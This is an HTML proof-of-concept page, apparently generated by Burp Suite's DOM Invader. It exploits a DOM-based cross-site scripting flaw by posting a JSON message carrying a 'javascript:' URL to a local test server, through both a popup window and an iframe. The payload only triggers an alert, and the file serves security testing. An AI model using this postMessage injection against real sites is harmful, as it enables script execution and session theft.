
<!doctype html>
<html>
    <head>
        <!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite -->
        <meta charset="UTF-8" />
        <title>Postmessage PoC</title>
        <script>
            function pocLink() {
                let win = window.open('http://192.168.43.90:8000/');
                let msg = "{\n    \"goto\": \"javascript:alert(origin)\"\n}";
                
                setTimeout(function(){
                    win.postMessage(msg, '*');
                }, 5000);
            }
            function pocFrame(win) {           
                let msg = "{\n    \"goto\": \"javascript:alert(origin)\"\n}";
                
                win.postMessage(msg, '*');          
            }
        </script>
    </head>
    <body>
        <a href="#" onclick="pocLink();">PoC link</a>          
        <iframe src="http://192.168.43.90:8000/" onload="pocFrame(this.contentWindow)"></iframe>                    
    </body>
</html>
